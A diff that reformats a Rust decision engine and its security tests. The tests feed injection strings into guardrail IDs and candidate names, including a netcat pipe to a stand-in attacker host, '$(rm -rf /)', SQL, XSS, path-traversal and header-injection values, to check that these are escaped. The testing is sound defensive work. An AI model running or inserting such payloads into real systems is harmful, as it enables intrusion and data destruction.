@@ -195,11 +195,19 @@ impl DecisionEngine {
 
             // Per-candidate guardrail filter.
             if candidate.guardrail_filtered {
-                push_bounded(&mut blocking_ids, GuardrailId::new("per_candidate_guardrail"), 50);
-                push_bounded(&mut blocking_reasons, format!(
-                    "candidate {} blocked by guardrail filter",
-                    candidate.candidate_ref.0
-                ), 50);
+                push_bounded(
+                    &mut blocking_ids,
+                    GuardrailId::new("per_candidate_guardrail"),
+                    50,
+                );
+                push_bounded(
+                    &mut blocking_reasons,
+                    format!(
+                        "candidate {} blocked by guardrail filter",
+                        candidate.candidate_ref.0
+                    ),
+                    50,
+                );
             }
 
             if blocking_ids.is_empty() {
@@ -211,12 +219,16 @@ impl DecisionEngine {
                 // [EVD-DECIDE-002] candidate blocked
                 let _event = EVD_DECIDE_002;
 
-                push_bounded(&mut blocked, BlockedCandidate {
-                    candidate: candidate.candidate_ref.clone(),
-                    blocked_by: blocking_ids,
-                    bayesian_rank: rank,
-                    reasons: blocking_reasons,
-                }, 100);
+                push_bounded(
+                    &mut blocked,
+                    BlockedCandidate {
+                        candidate: candidate.candidate_ref.clone(),
+                        blocked_by: blocking_ids,
+                        bayesian_rank: rank,
+                        reasons: blocking_reasons,
+                    },
+                    100,
+                );
             }
         }
 
@@ -957,16 +969,16 @@ mod tests {
     fn negative_guardrail_id_with_unicode_and_injection_attacks() {
         // Test GuardrailId with various Unicode and injection attack vectors
         let malicious_ids = vec![
-            "\u{202E}fake_id\u{202D}",                    // Unicode BiDi override
-            "id\u{00A0}nonbreaking\u{200B}zerowidth",    // Invisible Unicode chars
-            "guardrail\x00null\x01control",               // Null bytes and control chars
-            "id'; DROP TABLE decisions; --",              // SQL injection attempt
-            "<script>alert('xss')</script>",              // XSS attempt
-            "../../etc/passwd",                            // Path traversal
-            "id|nc attacker.com 4444",                    // Command injection
-            "\u{1F4A9}emoji_id\u{1F600}",                // Emoji characters
-            "café\u{0301}normalized",                     // NFD normalization
-            "\n\r\nHTTP/1.1 200 OK\r\n\r\n<html>",       // HTTP header injection
+            "\u{202E}fake_id\u{202D}",                // Unicode BiDi override
+            "id\u{00A0}nonbreaking\u{200B}zerowidth", // Invisible Unicode chars
+            "guardrail\x00null\x01control",           // Null bytes and control chars
+            "id'; DROP TABLE decisions; --",          // SQL injection attempt
+            "<script>alert('xss')</script>",          // XSS attempt
+            "../../etc/passwd",                       // Path traversal
+            "id|nc attacker.com 4444",                // Command injection
+            "\u{1F4A9}emoji_id\u{1F600}",             // Emoji characters
+            "café\u{0301}normalized",                 // NFD normalization
+            "\n\r\nHTTP/1.1 200 OK\r\n\r\n<html>",    // HTTP header injection
         ];
 
         for malicious_id in malicious_ids {
@@ -1014,7 +1026,10 @@ mod tests {
 
         // Should choose first unblocked candidate (candidate_001, rank 1)
         assert_eq!(outcome.chosen, Some(c("candidate_00001")));
-        assert_eq!(outcome.reason, DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 });
+        assert_eq!(
+            outcome.reason,
+            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 1 }
+        );
 
         // Should have exactly 100 blocked candidates (every 100th starting from 0)
         assert_eq!(outcome.blocked.len(), 100);
@@ -1061,12 +1076,19 @@ mod tests {
             // except for edge cases that might pass through
             match outcome.reason {
                 DecisionReason::AllCandidatesBlocked => {
-                    assert!(!outcome.blocked.is_empty(),
-                           "Should have blocked candidates for: {}", description);
+                    assert!(
+                        !outcome.blocked.is_empty(),
+                        "Should have blocked candidates for: {}",
+                        description
+                    );
                 }
                 DecisionReason::TopCandidateAccepted => {
-                    assert_eq!(outcome.chosen, Some(c("test_candidate")),
-                             "Should accept candidate for: {}", description);
+                    assert_eq!(
+                        outcome.chosen,
+                        Some(c("test_candidate")),
+                        "Should accept candidate for: {}",
+                        description
+                    );
                 }
                 _ => panic!("Unexpected reason for: {}", description),
             }
@@ -1121,12 +1143,14 @@ mod tests {
             // Maximum blocked candidates
             DecisionOutcome {
                 chosen: None,
-                blocked: (0..1000).map(|i| BlockedCandidate {
-                    candidate: c(&format!("candidate_{}", i)),
-                    blocked_by: vec![GuardrailId::new(&format!("guardrail_{}", i))],
-                    bayesian_rank: i,
-                    reasons: vec![format!("Reason {}", i)],
-                }).collect(),
+                blocked: (0..1000)
+                    .map(|i| BlockedCandidate {
+                        candidate: c(&format!("candidate_{}", i)),
+                        blocked_by: vec![GuardrailId::new(&format!("guardrail_{}", i))],
+                        bayesian_rank: i,
+                        reasons: vec![format!("Reason {}", i)],
+                    })
+                    .collect(),
                 reason: DecisionReason::AllCandidatesBlocked,
                 epoch_id: u64::MAX,
             },
@@ -1163,8 +1187,10 @@ mod tests {
             assert_eq!(parsed.chosen, outcome.chosen);
             assert_eq!(parsed.blocked.len(), outcome.blocked.len());
 
-            println!("Edge case {} completed in serialize: {:?}, deserialize: {:?}",
-                    i, serialization_duration, deserialization_duration);
+            println!(
+                "Edge case {} completed in serialize: {:?}, deserialize: {:?}",
+                i, serialization_duration, deserialization_duration
+            );
         }
     }
 
@@ -1176,8 +1202,12 @@ mod tests {
             DecisionReason::NoCandidates,
             DecisionReason::AllCandidatesBlocked,
             DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: 0 },
-            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: usize::MAX },
-            DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: usize::MAX / 2 },
+            DecisionReason::TopCandidateBlockedFallbackUsed {
+                fallback_rank: usize::MAX,
+            },
+            DecisionReason::TopCandidateBlockedFallbackUsed {
+                fallback_rank: usize::MAX / 2,
+            },
         ];
 
         for reason in all_reasons {
@@ -1197,7 +1227,10 @@ mod tests {
             match &parsed.reason {
                 DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } => {
                     // Fallback rank should be preserved exactly
-                    if let DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank: original_rank } = &reason {
+                    if let DecisionReason::TopCandidateBlockedFallbackUsed {
+                        fallback_rank: original_rank,
+                    } = &reason
+                    {
                         assert_eq!(fallback_rank, original_rank);
                     }
                 }
@@ -1229,23 +1262,49 @@ mod tests {
         // All outcomes should be identical (determinism requirement)
         let first = &outcomes[0];
         for (i, outcome) in outcomes.iter().enumerate() {
-            assert_eq!(outcome.chosen, first.chosen,
-                      "Chosen candidate differs at iteration {}", i);
-            assert_eq!(outcome.reason, first.reason,
-                      "Decision reason differs at iteration {}", i);
-            assert_eq!(outcome.blocked.len(), first.blocked.len(),
-                      "Blocked count differs at iteration {}", i);
-            assert_eq!(outcome.epoch_id, first.epoch_id,
-                      "Epoch ID differs at iteration {}", i);
+            assert_eq!(
+                outcome.chosen, first.chosen,
+                "Chosen candidate differs at iteration {}",
+                i
+            );
+            assert_eq!(
+                outcome.reason, first.reason,
+                "Decision reason differs at iteration {}",
+                i
+            );
+            assert_eq!(
+                outcome.blocked.len(),
+                first.blocked.len(),
+                "Blocked count differs at iteration {}",
+                i
+            );
+            assert_eq!(
+                outcome.epoch_id, first.epoch_id,
+                "Epoch ID differs at iteration {}",
+                i
+            );
 
             // Verify blocked candidates are identical
-            for (j, (blocked_a, blocked_b)) in outcome.blocked.iter().zip(first.blocked.iter()).enumerate() {
-                assert_eq!(blocked_a.candidate, blocked_b.candidate,
-                          "Blocked candidate {} differs at iteration {}", j, i);
-                assert_eq!(blocked_a.bayesian_rank, blocked_b.bayesian_rank,
-                          "Blocked rank {} differs at iteration {}", j, i);
-                assert_eq!(blocked_a.blocked_by.len(), blocked_b.blocked_by.len(),
-                          "Blocked reason count {} differs at iteration {}", j, i);
+            for (j, (blocked_a, blocked_b)) in
+                outcome.blocked.iter().zip(first.blocked.iter()).enumerate()
+            {
+                assert_eq!(
+                    blocked_a.candidate, blocked_b.candidate,
+                    "Blocked candidate {} differs at iteration {}",
+                    j, i
+                );
+                assert_eq!(
+                    blocked_a.bayesian_rank, blocked_b.bayesian_rank,
+                    "Blocked rank {} differs at iteration {}",
+                    j, i
+                );
+                assert_eq!(
+                    blocked_a.blocked_by.len(),
+                    blocked_b.blocked_by.len(),
+                    "Blocked reason count {} differs at iteration {}",
+                    j,
+                    i
+                );
             }
         }
     }
@@ -1273,9 +1332,10 @@ mod tests {
             assert_eq!(blocked.bayesian_rank, rank_value);
 
             // Test in DecisionReason context
-            if rank_value < 1000 {  // Avoid creating huge candidate arrays
+            if rank_value < 1000 {
+                // Avoid creating huge candidate arrays
                 let reason = DecisionReason::TopCandidateBlockedFallbackUsed {
-                    fallback_rank: rank_value
+                    fallback_rank: rank_value,
                 };
 
                 let outcome = DecisionOutcome {
@@ -1290,7 +1350,9 @@ mod tests {
                 let parsed: DecisionOutcome = serde_json::from_str(&json).unwrap();
 
                 assert_eq!(parsed.blocked[0].bayesian_rank, rank_value);
-                if let DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } = parsed.reason {
+                if let DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } =
+                    parsed.reason
+                {
                     assert_eq!(fallback_rank, rank_value);
                 }
             }
@@ -1301,15 +1363,15 @@ mod tests {
     fn negative_guardrail_id_consistency_under_various_string_operations() {
         // Test GuardrailId behavior with various string manipulation edge cases
         let test_strings = vec![
-            "",                                    // Empty string
-            " ",                                   // Single space
-            "\t\n\r",                             // Whitespace only
-            "\0",                                  // Null character
-            "\u{FEFF}BOM",                        // BOM character
-            "a\u{0308}",                          // Combining character
-            "𝕊𝕡𝕖𝕔𝕚𝕒𝕝",                          // Mathematical alphanumeric symbols
-            "🦀🚀💥",                             // Multiple emoji
-            "test".repeat(1000),                   // Very long string
+            "",                  // Empty string
+            " ",                 // Single space
+            "\t\n\r",            // Whitespace only
+            "\0",                // Null character
+            "\u{FEFF}BOM",       // BOM character
+            "a\u{0308}",         // Combining character
+            "𝕊𝕡𝕖𝕔𝕚𝕒𝕝",           // Mathematical alphanumeric symbols
+            "🦀🚀💥",            // Multiple emoji
+            "test".repeat(1000), // Very long string
         ];
 
         for test_string in test_strings {
@@ -1355,11 +1417,11 @@ mod tests {
 
         // Unicode injection attempts in guardrail IDs and candidate references
         let malicious_candidates = vec![
-            ranked("\u{202E}safe-candidate\u{202D}malicious", 0.9, false),  // BiDi override
-            ranked("candidate\u{200B}001", 0.8, false),  // Zero-width space
-            ranked("secure\u{FEFF}candidate", 0.7, false),  // Zero-width no-break space
-            ranked("\u{0000}bypass", 0.6, false),  // Null injection
-            ranked("candidate\u{2028}injection", 0.5, false),  // Line separator
+            ranked("\u{202E}safe-candidate\u{202D}malicious", 0.9, false), // BiDi override
+            ranked("candidate\u{200B}001", 0.8, false),                    // Zero-width space
+            ranked("secure\u{FEFF}candidate", 0.7, false), // Zero-width no-break space
+            ranked("\u{0000}bypass", 0.6, false),          // Null injection
+            ranked("candidate\u{2028}injection", 0.5, false), // Line separator
         ];
 
         let monitors = default_monitors();
@@ -1367,14 +1429,16 @@ mod tests {
 
         // Unicode should not affect decision logic
         match decision.reason {
-            DecisionReason::TopCandidateAccepted |
-            DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
+            DecisionReason::TopCandidateAccepted
+            | DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
                 if let Some(chosen) = &decision.chosen {
                     // Chosen candidate should not be manipulated by Unicode normalization
-                    assert!(!constant_time::ct_eq(chosen.as_str().as_bytes(), b"malicious"),
-                           "Unicode injection should not create malicious candidates");
+                    assert!(
+                        !constant_time::ct_eq(chosen.as_str().as_bytes(), b"malicious"),
+                        "Unicode injection should not create malicious candidates"
+                    );
                 }
-            },
+            }
             _ => {
                 // Other outcomes are acceptable for security
             }
@@ -1382,15 +1446,21 @@ mod tests {
 
         // Blocked candidates should preserve original references
         for blocked in &decision.blocked {
-            assert!(!blocked.candidate.as_str().contains('\0'),
-                   "Null bytes should not appear in candidate references");
-            assert!(!blocked.reasons.iter().any(|r| r.contains('\0')),
-                   "Null bytes should not appear in blocking reasons");
+            assert!(
+                !blocked.candidate.as_str().contains('\0'),
+                "Null bytes should not appear in candidate references"
+            );
+            assert!(
+                !blocked.reasons.iter().any(|r| r.contains('\0')),
+                "Null bytes should not appear in blocking reasons"
+            );
 
             // Guardrail IDs should not be manipulated
             for guardrail_id in &blocked.blocked_by {
-                assert!(!constant_time::ct_eq(guardrail_id.as_str().as_bytes(), b"bypass"),
-                       "Unicode injection should not create bypass guardrails");
+                assert!(
+                    !constant_time::ct_eq(guardrail_id.as_str().as_bytes(), b"bypass"),
+                    "Unicode injection should not create bypass guardrails"
+                );
             }
         }
     }
@@ -1404,11 +1474,15 @@ mod tests {
         // Attempt memory exhaustion through massive candidate sets
         let mut large_candidate_set = vec![];
         for i in 0..100_000 {
-            push_bounded(&mut large_candidate_set, ranked(
-                &format!("candidate_{}", i),
-                0.5 + (i as f64 / 200_000.0),  // Varying posteriors
-                false
-            ), 10000);
+            push_bounded(
+                &mut large_candidate_set,
+                ranked(
+                    &format!("candidate_{}", i),
+                    0.5 + (i as f64 / 200_000.0), // Varying posteriors
+                    false,
+                ),
+                10000,
+            );
         }
 
         // Should either handle gracefully or reject
@@ -1420,15 +1494,24 @@ mod tests {
             Ok(decision) => {
                 // If processing succeeded, verify decision integrity
                 match decision.reason {
-                    DecisionReason::TopCandidateAccepted |
-                    DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
-                        assert!(decision.chosen.is_some(), "Decision should have chosen candidate");
-                    },
+                    DecisionReason::TopCandidateAccepted
+                    | DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
+                        assert!(
+                            decision.chosen.is_some(),
+                            "Decision should have chosen candidate"
+                        );
+                    }
                     DecisionReason::AllCandidatesBlocked => {
-                        assert!(decision.chosen.is_none(), "No candidate should be chosen when all blocked");
-                        assert_eq!(decision.blocked.len(), large_candidate_set.len(),
-                                 "All candidates should be reported as blocked");
-                    },
+                        assert!(
+                            decision.chosen.is_none(),
+                            "No candidate should be chosen when all blocked"
+                        );
+                        assert_eq!(
+                            decision.blocked.len(),
+                            large_candidate_set.len(),
+                            "All candidates should be reported as blocked"
+                        );
+                    }
                     DecisionReason::NoCandidates => {
                         panic!("Should not report no candidates when candidates were provided");
                     }
@@ -1436,9 +1519,11 @@ mod tests {
 
                 // Decision should be deterministic even with large sets
                 let second_decision = engine.decide(&large_candidate_set, &monitors, &system_state);
-                assert_eq!(decision.reason, second_decision.reason,
-                         "Decision should be deterministic with large candidate sets");
-            },
+                assert_eq!(
+                    decision.reason, second_decision.reason,
+                    "Decision should be deterministic with large candidate sets"
+                );
+            }
             Err(_) => {
                 // Graceful panic handling is acceptable for extreme memory pressure
             }
@@ -1454,14 +1539,14 @@ mod tests {
 
         // Test with extreme posterior probability values
         let extreme_candidates = vec![
-            ranked("extreme_high", f64::INFINITY, false),  // Positive infinity
-            ranked("extreme_low", f64::NEG_INFINITY, false),  // Negative infinity
-            ranked("not_a_number", f64::NAN, false),  // NaN
-            ranked("above_one", 1.0000000000000002, false),  // Slightly above 1.0
-            ranked("below_zero", -0.0000000000000001, false),  // Slightly below 0.0
-            ranked("max_float", f64::MAX, false),  // Maximum float
-            ranked("min_float", f64::MIN, false),  // Minimum float
-            ranked("epsilon", f64::EPSILON, false),  // Machine epsilon
+            ranked("extreme_high", f64::INFINITY, false), // Positive infinity
+            ranked("extreme_low", f64::NEG_INFINITY, false), // Negative infinity
+            ranked("not_a_number", f64::NAN, false),      // NaN
+            ranked("above_one", 1.0000000000000002, false), // Slightly above 1.0
+            ranked("below_zero", -0.0000000000000001, false), // Slightly below 0.0
+            ranked("max_float", f64::MAX, false),         // Maximum float
+            ranked("min_float", f64::MIN, false),         // Minimum float
+            ranked("epsilon", f64::EPSILON, false),       // Machine epsilon
         ];
 
         let decision = engine.decide(&extreme_candidates, &monitors, &system_state);
@@ -1473,21 +1558,26 @@ mod tests {
                     // Verify chosen candidate has reasonable properties
                     for candidate in &extreme_candidates {
                         if candidate.candidate_ref.as_str() == chosen.as_str() {
-                            assert!(candidate.posterior_prob.is_finite() ||
-                                   candidate.posterior_prob.is_infinite() && candidate.posterior_prob > 0.0,
-                                   "Only finite or positive infinite posteriors should be chosen");
+                            assert!(
+                                candidate.posterior_prob.is_finite()
+                                    || candidate.posterior_prob.is_infinite()
+                                        && candidate.posterior_prob > 0.0,
+                                "Only finite or positive infinite posteriors should be chosen"
+                            );
                             break;
                         }
                     }
                 }
-            },
+            }
             DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } => {
-                assert!(fallback_rank < extreme_candidates.len(),
-                       "Fallback rank should be within candidate bounds");
-            },
+                assert!(
+                    fallback_rank < extreme_candidates.len(),
+                    "Fallback rank should be within candidate bounds"
+                );
+            }
             DecisionReason::AllCandidatesBlocked => {
                 // Expected behavior for extreme values that violate guardrails
-            },
+            }
             DecisionReason::NoCandidates => {
                 panic!("Should not report no candidates when candidates were provided");
             }
@@ -1495,8 +1585,10 @@ mod tests {
 
         // Decision should be deterministic even with extreme values
         let second_decision = engine.decide(&extreme_candidates, &monitors, &system_state);
-        assert_eq!(decision.reason, second_decision.reason,
-                 "Decision should be deterministic with extreme posterior values");
+        assert_eq!(
+            decision.reason, second_decision.reason,
+            "Decision should be deterministic with extreme posterior values"
+        );
     }
 
     #[test]
@@ -1507,26 +1599,26 @@ mod tests {
         // Attempt to bypass guardrails through system state manipulation
         let bypass_states = vec![
             SystemState {
-                memory_used_bytes: 0,  // Attempt to show no memory usage
-                memory_budget_bytes: u64::MAX,  // Extreme budget to avoid memory checks
-                durability_level: 1.0,  // Perfect durability
+                memory_used_bytes: 0,          // Attempt to show no memory usage
+                memory_budget_bytes: u64::MAX, // Extreme budget to avoid memory checks
+                durability_level: 1.0,         // Perfect durability
                 hardening_level: HardeningLevel::Standard,
                 proposed_hardening_level: None,
-                evidence_emission_active: false,  // Disable evidence
+                evidence_emission_active: false, // Disable evidence
                 memory_tail_risk: None,
                 reliability_telemetry: None,
-                epoch_id: u64::MAX,  // Extreme epoch
+                epoch_id: u64::MAX, // Extreme epoch
             },
             SystemState {
-                memory_used_bytes: u64::MAX,  // Extreme memory usage
-                memory_budget_bytes: 1,  // Minimal budget to trigger constraints
-                durability_level: 0.0,  // No durability
+                memory_used_bytes: u64::MAX, // Extreme memory usage
+                memory_budget_bytes: 1,      // Minimal budget to trigger constraints
+                durability_level: 0.0,       // No durability
                 hardening_level: HardeningLevel::Standard,
                 proposed_hardening_level: Some(HardeningLevel::Standard),
                 evidence_emission_active: true,
-                memory_tail_risk: Some(0.99),  // High tail risk
+                memory_tail_risk: Some(0.99), // High tail risk
                 reliability_telemetry: None,
-                epoch_id: 0,  // Zero epoch
+                epoch_id: 0, // Zero epoch
             },
         ];
 
@@ -1545,18 +1637,20 @@ mod tests {
                     // Expected when system state violates guardrails
                     assert!(decision.chosen.is_none());
                     assert!(!decision.blocked.is_empty());
-                },
-                DecisionReason::TopCandidateAccepted |
-                DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
+                }
+                DecisionReason::TopCandidateAccepted
+                | DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
                     // If a candidate was chosen, verify guardrail constraints were respected
                     assert!(decision.chosen.is_some());
 
                     // Should not bypass fundamental constraints
                     if bypass_state.memory_used_bytes > bypass_state.memory_budget_bytes {
-                        assert!(!decision.blocked.is_empty(),
-                               "Memory constraint violations should block candidates");
+                        assert!(
+                            !decision.blocked.is_empty(),
+                            "Memory constraint violations should block candidates"
+                        );
                     }
-                },
+                }
                 DecisionReason::NoCandidates => {
                     panic!("Should not report no candidates when candidates were provided");
                 }
@@ -1564,8 +1658,10 @@ mod tests {
 
             // Decision should still be deterministic
             let second_decision = engine.decide(&normal_candidates, &monitors, &bypass_state);
-            assert_eq!(decision.reason, second_decision.reason,
-                     "Decision should be deterministic even with manipulated system state");
+            assert_eq!(
+                decision.reason, second_decision.reason,
+                "Decision should be deterministic even with manipulated system state"
+            );
         }
     }
 
@@ -1577,11 +1673,15 @@ mod tests {
 
         // Candidates and decision reasons with injection attempts
         let injection_candidates = vec![
-            ranked("\";alert('xss');//", 0.9, false),  // JS injection
-            ranked("candidate</script><script>alert('xss')</script>", 0.8, false),  // HTML injection
-            ranked("$(rm -rf /)", 0.7, false),  // Command injection
-            ranked("line1\nline2\r\nline3", 0.6, false),  // Newline injection
-            ranked("quote\"injection'test", 0.5, false),  // Quote injection
+            ranked("\";alert('xss');//", 0.9, false), // JS injection
+            ranked(
+                "candidate</script><script>alert('xss')</script>",
+                0.8,
+                false,
+            ), // HTML injection
+            ranked("$(rm -rf /)", 0.7, false),        // Command injection
+            ranked("line1\nline2\r\nline3", 0.6, false), // Newline injection
+            ranked("quote\"injection'test", 0.5, false), // Quote injection
         ];
 
         let decision = engine.decide(&injection_candidates, &monitors, &system_state);
@@ -1590,11 +1690,23 @@ mod tests {
         let json = serde_json::to_string(&decision).expect("should serialize");
 
         // JSON should escape all injection attempts
-        assert!(!json.contains("alert('xss')"), "JavaScript injection should be escaped");
-        assert!(!json.contains("</script>"), "HTML injection should be escaped");
-        assert!(!json.contains("rm -rf"), "Command injection should be escaped");
+        assert!(
+            !json.contains("alert('xss')"),
+            "JavaScript injection should be escaped"
+        );
+        assert!(
+            !json.contains("</script>"),
+            "HTML injection should be escaped"
+        );
+        assert!(
+            !json.contains("rm -rf"),
+            "Command injection should be escaped"
+        );
         assert!(!json.contains("\n"), "Newline injection should be escaped");
-        assert!(!json.contains("\r"), "Carriage return injection should be escaped");
+        assert!(
+            !json.contains("\r"),
+            "Carriage return injection should be escaped"
+        );
 
         // Roundtrip should preserve structure but escape content
         let parsed: DecisionOutcome = serde_json::from_str(&json).expect("should deserialize");
@@ -1621,14 +1733,26 @@ mod tests {
             let engine_clone = Arc::clone(&engine);
             let handle = thread::spawn(move || {
                 let candidates = vec![
-                    ranked(&format!("candidate_{}_a", i), 0.9 - (i as f64 / 100.0), false),
-                    ranked(&format!("candidate_{}_b", i), 0.8 - (i as f64 / 100.0), false),
-                    ranked(&format!("candidate_{}_c", i), 0.7 - (i as f64 / 100.0), false),
+                    ranked(
+                        &format!("candidate_{}_a", i),
+                        0.9 - (i as f64 / 100.0),
+                        false,
+                    ),
+                    ranked(
+                        &format!("candidate_{}_b", i),
+                        0.8 - (i as f64 / 100.0),
+                        false,
+                    ),
+                    ranked(
+                        &format!("candidate_{}_c", i),
+                        0.7 - (i as f64 / 100.0),
+                        false,
+                    ),
                 ];
 
                 let mut system_state = healthy_state();
                 system_state.epoch_id = 42 + i as u64;
-                system_state.memory_used_bytes += (i as u64 * 1_000_000);  // Varying memory usage
+                system_state.memory_used_bytes += (i as u64 * 1_000_000); // Varying memory usage
 
                 let monitors = default_monitors();
                 engine_clone.decide(&candidates, &monitors, &system_state)
@@ -1649,24 +1773,30 @@ mod tests {
             match decision.reason {
                 DecisionReason::NoCandidates => {
                     panic!("Thread {} should not report no candidates", i);
-                },
+                }
                 _ => {
                     // All other outcomes are valid
                 }
             }
 
             // Epoch ID should be preserved
-            assert_eq!(decision.epoch_id, 42 + i as u64,
-                     "Epoch ID should be preserved in concurrent decisions");
+            assert_eq!(
+                decision.epoch_id,
+                42 + i as u64,
+                "Epoch ID should be preserved in concurrent decisions"
+            );
 
             // Decision structure should be intact
-            assert!(decision.blocked.len() <= 3, "Should not have more blocked candidates than provided");
+            assert!(
+                decision.blocked.len() <= 3,
+                "Should not have more blocked candidates than provided"
+            );
         }
     }
 
     #[test]
     fn test_security_arithmetic_overflow_in_rankings_and_epochs() {
-        let engine = DecisionEngine::new(u64::MAX);  // Extreme epoch
+        let engine = DecisionEngine::new(u64::MAX); // Extreme epoch
         let monitors = default_monitors();
 
         // System state with extreme values
@@ -1679,20 +1809,24 @@ mod tests {
             evidence_emission_active: true,
             memory_tail_risk: Some(1.0),
             reliability_telemetry: None,
-            epoch_id: u64::MAX,  // Maximum epoch
+            epoch_id: u64::MAX, // Maximum epoch
         };
 
         // Candidates with extreme rankings
         let mut extreme_candidates = vec![];
         for i in 0..1000 {
-            push_bounded(&mut extreme_candidates, RankedCandidate {
-                candidate_ref: c(&format!("candidate_{}", i)),
-                posterior_prob: 0.5,
-                prior_prob: 0.5,
-                observation_count: usize::MAX,  // Extreme observation count
-                confidence_interval: (0.0, 1.0),
-                guardrail_filtered: false,
-            }, 2000);
+            push_bounded(
+                &mut extreme_candidates,
+                RankedCandidate {
+                    candidate_ref: c(&format!("candidate_{}", i)),
+                    posterior_prob: 0.5,
+                    prior_prob: 0.5,
+                    observation_count: usize::MAX, // Extreme observation count
+                    confidence_interval: (0.0, 1.0),
+                    guardrail_filtered: false,
+                },
+                2000,
+            );
         }
 
         let decision = engine.decide(&extreme_candidates, &monitors, &extreme_state);
@@ -1702,19 +1836,26 @@ mod tests {
 
         match decision.reason {
             DecisionReason::TopCandidateBlockedFallbackUsed { fallback_rank } => {
-                assert!(fallback_rank < extreme_candidates.len(),
-                       "Fallback rank should not overflow");
-            },
+                assert!(
+                    fallback_rank < extreme_candidates.len(),
+                    "Fallback rank should not overflow"
+                );
+            }
             DecisionReason::AllCandidatesBlocked => {
                 // Expected due to extreme memory usage
-                assert_eq!(decision.blocked.len(), extreme_candidates.len(),
-                         "All candidates should be blocked");
+                assert_eq!(
+                    decision.blocked.len(),
+                    extreme_candidates.len(),
+                    "All candidates should be blocked"
+                );
 
                 for blocked in &decision.blocked {
-                    assert!(blocked.bayesian_rank < extreme_candidates.len(),
-                           "Bayesian rank should not overflow");
+                    assert!(
+                        blocked.bayesian_rank < extreme_candidates.len(),
+                        "Bayesian rank should not overflow"
+                    );
                 }
-            },
+            }
             _ => {
                 // Other outcomes are acceptable
             }
@@ -1735,23 +1876,23 @@ mod tests {
         let manipulated_states = vec![
             SystemState {
                 memory_used_bytes: 0,
-                memory_budget_bytes: 0,  // Zero budget (divide by zero attempt)
-                durability_level: f64::INFINITY,  // Infinite durability
+                memory_budget_bytes: 0, // Zero budget (divide by zero attempt)
+                durability_level: f64::INFINITY, // Infinite durability
                 hardening_level: HardeningLevel::Standard,
                 proposed_hardening_level: None,
                 evidence_emission_active: true,
-                memory_tail_risk: Some(f64::NAN),  // NaN risk
+                memory_tail_risk: Some(f64::NAN), // NaN risk
                 reliability_telemetry: None,
                 epoch_id: 42,
             },
             SystemState {
                 memory_used_bytes: u64::MAX,
                 memory_budget_bytes: 1,
-                durability_level: f64::NEG_INFINITY,  // Negative infinite durability
+                durability_level: f64::NEG_INFINITY, // Negative infinite durability
                 hardening_level: HardeningLevel::Standard,
                 proposed_hardening_level: None,
                 evidence_emission_active: true,
-                memory_tail_risk: Some(-1.0),  // Negative risk
+                memory_tail_risk: Some(-1.0), // Negative risk
                 reliability_telemetry: None,
                 epoch_id: 42,
             },
@@ -1769,12 +1910,12 @@ mod tests {
                         DecisionReason::AllCandidatesBlocked => {
                             // Expected for invalid system states
                             assert!(decision.chosen.is_none());
-                        },
-                        DecisionReason::TopCandidateAccepted |
-                        DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
+                        }
+                        DecisionReason::TopCandidateAccepted
+                        | DecisionReason::TopCandidateBlockedFallbackUsed { .. } => {
                             // Should only happen if guardrails handle extreme values gracefully
                             assert!(decision.chosen.is_some());
-                        },
+                        }
                         DecisionReason::NoCandidates => {
                             panic!("Should not report no candidates when candidates were provided");
                         }
@@ -1782,7 +1923,7 @@ mod tests {
 
                     // Decision should include the epoch from the (possibly manipulated) state
                     assert_eq!(decision.epoch_id, manipulated_state.epoch_id);
-                },
+                }
                 Err(_) => {
                     // Graceful panic for invalid system states is acceptable
                 }
@@ -1811,31 +1952,52 @@ mod tests {
         // Should block due to memory constraint
         match decision.reason {
             DecisionReason::AllCandidatesBlocked => {
-                assert!(!decision.blocked.is_empty(), "Should have blocked candidates");
+                assert!(
+                    !decision.blocked.is_empty(),
+                    "Should have blocked candidates"
+                );
 
                 for blocked in &decision.blocked {
                     // Verify blocking reasons don't contain injection attempts
                     for reason in &blocked.reasons {
-                        assert!(!reason.contains("</script>"), "Reason should not contain HTML injection");
-                        assert!(!reason.contains("alert("), "Reason should not contain JS injection");
-                        assert!(!reason.contains("$("), "Reason should not contain command injection");
-                        assert!(!reason.contains('\0'), "Reason should not contain null bytes");
+                        assert!(
+                            !reason.contains("</script>"),
+                            "Reason should not contain HTML injection"
+                        );
+                        assert!(
+                            !reason.contains("alert("),
+                            "Reason should not contain JS injection"
+                        );
+                        assert!(
+                            !reason.contains("$("),
+                            "Reason should not contain command injection"
+                        );
+                        assert!(
+                            !reason.contains('\0'),
+                            "Reason should not contain null bytes"
+                        );
                         assert!(!reason.is_empty(), "Reason should not be empty");
                     }
 
                     // Guardrail IDs should be valid
                     for guardrail_id in &blocked.blocked_by {
-                        assert!(!guardrail_id.as_str().contains('\0'),
-                               "Guardrail ID should not contain null bytes");
-                        assert!(!guardrail_id.as_str().is_empty(),
-                               "Guardrail ID should not be empty");
+                        assert!(
+                            !guardrail_id.as_str().contains('\0'),
+                            "Guardrail ID should not contain null bytes"
+                        );
+                        assert!(
+                            !guardrail_id.as_str().is_empty(),
+                            "Guardrail ID should not be empty"
+                        );
                     }
 
                     // Bayesian rank should be within bounds
-                    assert!(blocked.bayesian_rank < candidates.len(),
-                           "Bayesian rank should be within candidate bounds");
+                    assert!(
+                        blocked.bayesian_rank < candidates.len(),
+                        "Bayesian rank should be within candidate bounds"
+                    );
                 }
-            },
+            }
             _ => {
                 // Other outcomes possible depending on guardrail behavior
             }
